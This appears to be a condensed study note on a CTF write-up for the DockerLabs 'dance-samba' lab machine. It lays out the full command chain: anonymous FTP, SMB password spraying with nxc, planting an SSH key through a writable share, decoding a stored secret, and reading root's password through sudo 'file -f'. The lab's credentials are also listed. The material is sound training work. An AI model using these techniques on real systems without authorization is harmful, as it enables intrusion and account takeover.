---
type: machine
platform: dockerlabs
difficulty: intermediate
ip: 172.17.0.2
cves: []
tools: [nmap, ping, ftp, nxc, smbmap, smbclient, ssh]
techniques: [information-gathering, ftp-anonymous-login, smb-enumeration, hardcoded-credentials, hash-cracking, sudo-abuse]
tags: [ejpt:assessment, ejpt:auditing, ejpt:host-net-pentest]
related: ["[[domain]]", "[[chmod-4755]]"]
---

# dance-samba

**Writeup:** [raw writeup](../../writeups/dockerlabs/intermediate/dance-samba.md)

FTP-hint → Samba spray box: an anonymous `nota.txt` names the user *and* her password, a writable home share becomes an SSH-key drop (no password needed), and sudo `file -f` turns a root-only file into a password leak.

## Path

1. **Recon** — `ping -c 2` (ttl=64) then `sudo nmap -p- --open -sS --min-rate 5000 -n -Pn`, deep pass with `-sCV` on the open ports → `21/tcp` vsftpd 3.0.5, `22/tcp` OpenSSH 9.6p1 Ubuntu, `139/445/tcp` Samba smbd 4; NSE `smb2-security-mode`: signing enabled but not required ([[information-gathering]], [[nmap]]).
2. **FTP anonymous** — NSE already flagged `ftp-anon` as allowed; `ftp TARGET` → single file `nota.txt`: *"I don't know what to do with Macarena, she's obsessed with donald."* — read it as data, not trivia: **macarena** (user) + **donald** (her obsession → password) ([[ftp-anonymous-login]], [[ftp]]).
3. **SMB null session** — `nxc smb TARGET --users` → `macarena` (last PW set 2024-08-19) confirms the hint's username; `smbmap -H TARGET` → `print$`, `macarena`, `IPC$` all **NO ACCESS** ([[smb-enumeration]], [[nxc]], [[smbmap]]).
4. **Spray with the hint** — `nxc smb TARGET -u macarena -p rockyou.txt --ignore-pw-decoding` → valid **`macarena:donald`** — the note *was* the password, so the spray was really just confirmation ([[nxc]]).
5. **Authenticated shares** — `nxc smb TARGET -u macarena -p donald --shares` flips `macarena` to **READ,WRITE** (it maps the user's home); `smbclient //TARGET/macarena -U "macarena%donald"` → `recurse on` + `mget *` pulls the whole home (dotfiles and all) including `user.txt` → **user flag** ([[smbclient]], [[smb-enumeration]]).
6. **Foothold without the password** — the share is the user's *home* and it's writable, so drop a key instead of cracking anything: `ssh-keygen -t ed25519`, write the pubkey into `.ssh/authorized_keys`, `mput .ssh` over smbclient, then `ssh -i ~/.ssh/id_ed25519 macarena@TARGET` ([[ssh]], [[smbclient]]). The author never learned macarena's real password — key auth sidesteps the whole question.
7. **Privesc enum (all negatives)** — no interesting SUID, no SGID at all, no capabilities, no useful crontabs. A directory sweep found a root-only `password.txt` (`-rw------- root root`, 16 bytes — unreadable) and a file at `/home/secret/hash`.
8. **"Hash" that isn't** — `cat /home/secret/hash` → `MMZVM522LBFHUWSXJYYWG3KWO5MVQTT2MQZDS6K2IE6T2===` → `base32 -d hash | base64 -d` → `supersecurepassword`. Despite the filename it's **encoding stacked twice**, not a hash — zero cracking ([[hash-cracking]]).
9. **Sudo** — `sudo -l` → `(ALL : ALL) /usr/bin/file` → GTFOBins **file-read** primitive: `sudo -u root /usr/bin/file -f /opt/password.txt` treats each line of the root-only file as a filename and echoes it back in the error output: ``root:rooteable2: cannot open `root:rooteable2' (No such file or directory)`` → `su root` with `rooteable2` → root ([[sudo-abuse]], [[gtfobins]]).
10. **Root flag** — `root.txt` is a decoy (*"It's not that easy, first root."*); the real flag lives in `true_root.txt`.

## Credentials / secrets

| Item | Value |
|------|-------|
| `macarena` (SMB + SSH key) | `donald` (rockyou via nxc; hinted by `nota.txt`) |
| `/home/secret/hash` | base32 + base64 → `supersecurepassword` |
| `root` (su) | `rooteable2` — leaked by sudo `file -f` |

## Takeaways

- **Read loose files as instructions, not trivia.** `nota.txt` handed over the username *and* the password relationship before a single brute-force attempt — the one `nxc` run was confirmation, not discovery ([[ftp-anonymous-login]], [[hardcoded-credentials]]).
- **A writable home share is SSH access.** When `smbmap` flips a share to READ,WRITE and that share is a user's home directory, you don't need their password: drop `authorized_keys` and log in with your own key ([[ssh]], [[smbclient]]).
- **Not everything named "hash" is a hash.** Check length/alphabet *and* for encoding first — `base32 -d | base64 -d` beat this one in one shot, no john needed ([[hash-cracking]]).
- **sudo + a file-reading binary = arbitrary root file read.** `file -f` prints every line back as a "filename it cannot open"; GTFOBins lists exactly this primitive, and it converted a 16-byte unreadable file into root's password ([[sudo-abuse]], [[gtfobins]]).
- **The flag can lie.** `root.txt` was a decoy — after root, look for variants (`true_root.txt`, `root2.txt`) instead of stopping at the first flag file.
